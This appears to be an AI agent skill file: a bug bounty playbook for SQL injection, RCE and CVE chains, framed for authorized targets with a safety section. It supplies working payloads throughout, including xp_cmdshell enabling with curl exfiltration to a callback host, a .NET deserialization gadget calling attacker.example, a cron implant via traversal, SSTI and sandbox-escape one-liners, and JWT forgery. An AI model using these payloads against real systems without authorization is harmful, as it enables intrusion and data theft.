---
name: bb-intel-rce-sqli
description: Hunting playbook for RCE, SQLi, and CVE exploitation chains distilled from real bug bounty writeups ($1k-$150k payouts). Use when hunting RCE/SQLi/CVE chains on an authorized target, when a search or filter parameter looks injectable, when an upload or download endpoint smells like path traversal, when a JWT or deserialization sink appears, or when you fingerprint a known CMS/framework and want a known-CVE next step.
---

# Bb Intel Rce Sqli

## Purpose and scope

Distilled methodology from 16 real writeups covering: error-based/blind/stacked SQLi (MySQL + MSSQL), SQLi-to-RCE via `xp_cmdshell`, blind file-write to RCE via cron, limited path traversal to admin-panel RCE, .NET deserialization, JWT `alg:none` impersonation, archive-extraction traversal, LLM-gateway (LiteLLM) RCE chains, Algolia key abuse, and CVE recon-to-exploit workflow.

Non-goals: web-wide XSS/CSRF/SSRF theory (use dedicated skills), mass scanning of out-of-scope assets, and destructive exploitation. This skill is technique-level; it does not replace recon or reporting skills.

## Preconditions

- Target is **authorized and in-scope** (bug bounty program or written engagement). Nothing here runs against unauthorized systems.
- You have already done basic recon: live host, tech fingerprint, and an interesting endpoint (search, upload, login, admin panel, API).
- For CVE work: you have a positive framework/CMS fingerprint (Wappalyzer, `httpx -td`) before testing any PoC.

## Decision tree

- Search/filter/login form hitting a DB, quote causes 500/SQLSTATE error → **Technique 1** (error-based SQLi) or **4** (manual UNION playbook).
- Body params sanitized but headers (User-Agent, X-Forwarded-For) may be logged → **Technique 2**; MSSQL backend → extend with **Technique 3** (stacked queries → xp_cmdshell).
- Strict WAF blocks all injection on a JSON API → **Technique 5** (type-confusion error oracle — stop injecting).
- Upload endpoint controls destination directory but forces random filename → **Technique 6** (attack the directory, cron/profile.d consumers).
- Odd-port subdomain 404s, Java/JSF stack, download endpoint → **Technique 7** (limited traversal → logs → admin console).
- JSON body with `$type` binding, no-code automation/webhook feature → **Technique 8** (.NET ObjectDataProvider).
- JWT handler / SharePoint / custom token validation → **Technique 9** (alg:none + actor token).
- LiteLLM / LLM proxy with low-priv key → **Technique 10** (chain catalog: SSTI, sandbox escape, metadata smuggling, env-ref theft).
- JS bundle leaks Algolia `appID` + key → **Technique 11**.
- Known CMS/framework fingerprint on wide-scope program → **Technique 12** (CVE recall workflow).

## Techniques

### 1. Error-based SQLi confirmation (MySQL)

**Signal:** search bar, filter, or POST body with array-style params like `XSearch[search_series]`.

1. Intercept the request in Burp → Repeater.
2. Append a single quote: `test'`. A `500` with verbose `SQLSTATE[42000] ... 1064` = smoke.
3. Double the quote: `test''` → `200 OK` normal content confirms the input reaches the SQL parser.
4. Boolean + time checks: `test' AND 1=1 --` vs `test' AND 1=2 --`, then `test' AND SLEEP(5) --`.
5. Hand off to SQLMap:
   `sqlmap -u "https://target/search" --data="XSearch[search_series]=test" -p "XSearch[search_series]" --risk=3 --level=5 --batch`

**Verify:** SQLMap names boolean-blind + error-based + time-based techniques and the backend DBMS; extract one non-destructive value (`@@version`) as proof.
**Failure recovery:** WAF blocking quotes → switch to Technique 5; no error verbosity → go blind (Technique 2 differentials).

### 2. Second-order SQLi via User-Agent / X-Forwarded-For

**Signal:** login flows, "we log your IP" features, analytics endpoints; body params all parameterized.

1. Baseline request, note normal response.
2. Put `'` in `User-Agent`; status change (200 → 401/500) means the header reaches a query.
3. Boolean differential: UA `' AND '1'='1` (normal) vs `' AND '1'='2` (error).
4. Fingerprint DBMS: `' AND substring(@@version,1,1)='1`.
5. Enumerate tables/columns with subselect + wordlist: `' AND (select 1 from WORDLIST limit 0,1)=1--`.
6. For XFF: `X-Forwarded-For: 127.0.0.1' union select sleep(10),null,null;-- -` — 10s delay confirms; exfil char-by-char with `substring(...)` + `sleep()` conditionals.

**Verify:** differentials consistent and repeatable; extract one value end-to-end (table → column → row).
**Failure recovery:** headers stripped by proxy → test other logging sinks (Referer, cookies); MSSQL error strings appear → escalate to Technique 3.

### 3. Stacked-query MSSQL injection → RCE via xp_cmdshell

**Signal:** MSSQL backend (error strings, `WAITFOR` works), injectable point where `;` stacking is allowed.

1. Confirm injection: `'--` restores normal page.
2. Test stacking: `';WAITFOR DELAY '00:00:05';--` (~5s delay confirms).
3. Enable xp_cmdshell: `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--`
4. Blind RCE check: `'; EXEC xp_cmdshell 'ping X.burpcollaborator.net';--` — watch Collaborator.
5. Non-destructive output exfil: `';EXEC xp_cmdshell 'powershell -c "$x = whoami; curl http://X.burpcollaborator.net/get?output=$x"';--`

**Verify:** Collaborator receives callbacks containing real command output (`whoami`).
**Failure recovery:** xp_cmdshell enable denied → report time-based SQLi as-is; egress blocked → try in-band exfil (see Technique 7 mindset).

### 4. Manual UNION-based extraction playbook

**Signal:** numeric ID params (`?id=2`) serving DB-driven content.

1. Assume query shape `SELECT ... FROM posts WHERE id=$id;`.
2. Column count: `ORDER BY n-- -` incrementing until error; last success = column count.
3. Use a **non-existent ID** (e.g. `40`) before UNION so the original row doesn't hide output:
   `40 union select 1,2,group_concat(schema_name),4 from information_schema.schemata;-- -`
4. Pivot tables → columns → dump: `group_concat(id,"~",flag) from flag-- -`.
5. Second-query injection: if a follow-up query uses a value from the first result, inject a full SELECT as a string: `2222 union select '1 union select 1,flag,3,4 from flag',2,3-- -`.
6. Boolean-blind fallback on register/username-check endpoints: char-by-char `SUBSTRING(...,1,1)='s'`.

**Verify:** extracted value confirmed by an equality query returning TRUE; negative controls throughout.
**Failure recovery:** UNION filtered → error-based or boolean-blind fallback (step 6).

### 5. Table dump without SQLi — DB error oracle

**Signal:** JSON API behind a strict WAF; endpoints echo ORM/driver errors.

1. Content-type switching (JSON↔XML), type confusion, nulls on every POST endpoint.
2. Send type-confused values: `{"customer":{"company":"X","email":null}}`.
3. Watch for raw driver errors like `PG::NotNullViolation ... Failing row contains (...)` — leaked DB type, table, columns, and a full row (incl. password hash) in the real case.
4. Enumerate the fuzzable parameter (e.g. company names via OSINT) and replay to dump rows through the error oracle.

**Verify:** error discloses a full failing row, reproducible across multiple values. Never inject — the WAF is why this works.
**Failure recovery:** errors generic → fall back to schema enumeration via error hints; no oracle → move on.

### 6. Blind file write → RCE via cron (no filename control)

**Signal:** upload accepts caller-controlled destination directory but forces random filename/extension (UUID + `.png`); no read-back, no LFI. Mindset: attack the **directory**, not the filename.

1. Confirm directory field enters the path: `uploadPath=../temp`, `..%2f..%2ftrav`, `/tmp/x`; check reflection in returned URL.
2. Prove real-FS write: overshoot traversal (`../` ×14 — harmless past `/`); `/etc`, `/tmp`, `/root` succeed, `/proc` fails "cannot create directory" = real FS; `/root` success = root writer.
3. Filesystem oracle: `<existing-file>/x` fails, absent path succeeds → yes/no existence probes (`/usr/sbin/crond`, `/.dockerenv`).
4. Plant self-removing crontab body into `/etc/cron.d` (cron ignores extensions):
   `* * * * * root /usr/bin/id > /tmp/proof 2>&1; /usr/bin/find /etc/cron.d -maxdepth 1 -name "*__*.png" -delete`
5. Read output via oracle: `touch "/tmp/out-$(id -u)-$(id -un)-$(uname -m)"`, then probe `/tmp/out-0-root-x86_64` with negative controls.
6. DNS-restricted egress bypass: `curl --resolve host:80:YOUR_IP` in the cron line for OOB callback.

**Verify:** proof file exists, crontab self-removed, collaborator receives `uid=0(root)`. Other directory consumers: `/etc/profile.d`, systemd units, logrotate.
**Failure recovery:** no cron daemon → try profile.d / systemd; write not root → target user-writable consumers.

### 7. Limited path traversal → admin RCE chain (Java/JSF)

**Signal:** odd-port subdomain (8443) returning 404; Java/JSF markers (`/faces/`, `.xhtml`).

1. Fuzz the 404 host anyway: `ffuf -u http://admin.target:8443/FUZZ` → `/admin/` → login at `/admin/faces/jsf/login.xhtml`.
2. Fuzz deeper: `/admin/FUZZ` → `/admin/download` (200, empty body).
3. Discover the parameter using a **known-valid file**: fuzz `filename=FUZZ`-style names against `/admin/js/main.js` → param is `fileName`.
4. Test traversal scope: `/etc/passwd` fails but files under `/admin/*` work = limited traversal. Read `/WEB-INF/web.xml` for servlet mappings → find `/incident-report` (real-time log zips).
5. Mine logs for credentials (MD5 admin passwords in the real case) → log into the admin panel.
6. Admin panel had a Groovy console (`export_step2.xhtml`) → RCE with no output.
7. Chain back: run `print "sudo cat /etc/passwd".execute().text`, then re-download `/admin/incident-report` logs — output lands in fresh logs. In-band exfil beat OOB ($40k, egress WAF blocked Collaborator).

**Verify:** command output appears in the real-time log download.
**Failure recovery:** no creds in logs → keep mining for tokens/config; console output-blessed but blind → always look for an in-band channel (logs, error pages, files you can re-download).

### 8. .NET deserialization RCE via automation webhooks

**Signal:** no-code/automation platforms (bots, scheduled workflows); .NET backend accepting custom JSON webhook bodies; any JSON with `$type` binding.

1. Create an automation bot with a schedule; add a "Call a webhook" step (POST to your server).
2. In the custom JSON body, inject an ObjectDataProvider gadget:

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, ...",
 "MethodName":"Start",
 "MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":
   ["cmd","/c powershell -command \"Invoke-WebRequest -URI http://attacker.example\""]},
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System, ..."}}
```

3. Save, wait for the scheduled run, check your server logs for a callback from vendor infrastructure.

**Verify:** HTTP request from the backend = code execution ($10k Google VRP).
**Failure recovery:** `$type` rejected → try other polymorphic serializers (TypeNameHandling hints in error messages); no scheduling feature → find any stored-JSON sink that is later deserialized.

### 9. JWT alg=none impersonation (SharePoint-style)

**Signal:** custom JWT handlers, SharePoint Server Subscription Edition, any handler that may set `RequireSignedTokens = false`.

1. Craft a Bearer JWT with header `{"typ":"JWT","alg":"none"}` and an empty signature segment.
2. To pass `ValidateIssuer`, nest an `actortoken` whose `x5t` header references the farm auth cert thumbprint — get the cert from `<siteurl>/_layouts/15/metadata/json/1`, SHA-1 the base64 cert for `x5t`.
3. Set `nameidissuer:AccessToken` + arbitrary `upn`/`nameid` to impersonate any user (up to SiteAdmin / `NT AUTHORITY\LOCAL SERVICE`).
4. For pages that don't accept app tokens, inject `/_api/` into path info: `POST /_layouts/15/ToolPane.aspx/_api/?DisplayMode=Edit...`.

**Verify:** unauthenticated request returns SiteAdmin-level API data (`/my/_api/web/siteusers`).
**Failure recovery:** alg:none rejected → test RS256→HS256 confusion with the public metadata cert; issuer validation strict → hunt other metadata endpoints for cert material.

### 10. LiteLLM / LLM-gateway RCE chain catalog

**Signal:** LiteLLM or similar Python LLM proxy; you hold a low-privilege `internal_user` key.

1. **DB-down auth bypass:** if config allows requests when DB is down, flood DB-touching endpoints with fabricated keys (failures aren't negatively cached → pool exhausts), then race `POST /key/generate {"user_id":"default_user_id","max_budget":999999,"duration":"365d"}` in the failure window.
2. **Jinja2 SSTI:** `POST /prompts/test` with `dotprompt_content` = `{{ cycler.__init__.__globals__.os.popen('id').read() }}` — autoescape does not stop SSTI.
3. **Sandbox escape via coroutine frames:** in `exec()` guardrails with emptied `__builtins__`, call an async helper un-awaited: `http_get("http://127.0.0.1").cr_frame.f_builtins["__import__"]("os").popen("id").read()`.
4. **Metadata smuggling:** top-level `allowed_passthrough_routes` is gated but `{"metadata":{"allowed_passthrough_routes":["/user","/team"]}}` in `/key/generate` persists verbatim.
5. **Prefix-match gates:** one allowed route `/user` grants `/user/update`, `/user/123` — always test sibling paths.
6. **Self-update mass assignment:** `/user/update` copied all fields → set `"user_role":"proxy_admin"`. Compare guards on `/user/new` vs `/user/update` — drift = bug.
7. **Env-reference secret theft:** store `langfuse_secret_key: "os.environ/LITELLM_MASTER_KEY"` via a write path missing the env-ref check, then hit a passthrough that echoes it to your listener; follow with MCP stdio RCE: `POST /v1/mcp/server {"transport":"stdio","command":"python3","args":["-c","<payload>"]}`.

**Verify:** chain ends in `id` output from the proxy container. Meta-lesson: patches fix one path, not the class — re-audit every sibling path touching the same sink after each fix.
**Failure recovery:** one primitive patched → pivot to another chain in the catalog; cache TTLs matter (60s user cache → sleep 65).

### 11. Algolia API key exploitation

**Signal:** site uses Algolia search; JS bundles contain `appID` + API key.

1. Grep `main.js` for `appID` + `api-key`.
2. Check ACL: `curl "https://{appID}-dsn.algolia.net/1/keys/{api-key}?x-algolia-application-id={appID}&x-algolia-api-key={api-key}" | jq`. `addObject`/`editSettings`/`deleteObject` = high; `search`/`listIndexes` only = informative.
3. List indexes: `... /1/indexes/`; dump data: `... /1/indexes/{index_name}`; read settings: `.../settings`.
4. Non-destructive PoC write: `PUT /1/indexes/{name}/settings --data '{"highlightPreTag": "hacked"}'` — `editSettings` can inject JS into search results (stored XSS at scale). **Never DELETE indexes.**

**Verify:** settings update reflected back; screenshot before/after.
**Failure recovery:** search-only ACL → report informative key exposure or move on.

### 12. CVE recon-to-exploit workflow

**Signal:** wide-scope program, mass subdomain triage, known CMS/framework fingerprint.

1. Collect subdomains, probe: `cat subdomains.txt | httpx -td -sc -title -ip`.
2. Open survivors in bulk, fingerprint each with Wappalyzer.
3. When a known stack appears (Liferay, WordPress plugin with version, SharePoint), recall/look up recent CVEs and test the public PoC. Examples from the digest: WordPress File Upload ≤ 4.24.11 (CVE-2024-9047, unauth `wfu_file_downloader.php` `file`/`handler` traversal → read `wp-config.php`); SharePoint CVE-2026-55040 (Technique 9); Apple PCC libarchive traversal (magic-byte extractor dispatch, no `ARCHIVE_EXTRACT_SECURE_*` flags → count `..` depth against what survives reboot).
4. Maintain a personal CVE-to-fingerprint mapping; every writeup you read feeds it.

**Verify:** version fingerprint matches the vulnerable range before firing any PoC.
**Failure recovery:** version patched or unclear → don't spray; log the asset for the next relevant CVE.

## Safety and authorization

- **Authorized in-scope targets only.** Every technique above assumes a program brief or written engagement permitting it.
- **Non-destructive PoC:** extract one proof value (`@@version`, `whoami`, `id`), never dump user tables. For Algolia, modify settings only — never DELETE indexes or objects.
- **Cache-buster requirement:** any request that could be cached or replayed by others (cache-poisoning-adjacent tests, shared search/settings mutations) must use a unique cache-buster parameter so real users never see your payload.
- **Contained PoC for exposed services:** for OOB callbacks use your own Collaborator/listener; for cron/file-write chains plant self-removing payloads and clean up proof files after capture.
- **No data exfiltration beyond proof:** one row, one command output, one token. Stop at demonstration; never crack real user hashes or accept real invitations.
- **Ask the program before pursuing full RCE** once you have admin access — one cited case got explicit green light and a higher total payout for split reports.
- Minimize noise: time-based payloads with short sleeps, no stacked destructive statements, no brute-force table dumps through error oracles beyond a few proof rows.

## Source notes

Full distilled cases, bounty figures, case-index table, coverage gaps, and source URLs: see `references/writeup-cases.md`. Three HackerOne reports were login-walled (GitLab ExifTool RCE, Mozilla Taskcluster GraphQL RCE, ingress-nginx RCE) and two were partial extractions (OnlyShells XSS stage, email-field guide) — evidence there is thin; treat those classes as pointers, not procedures.
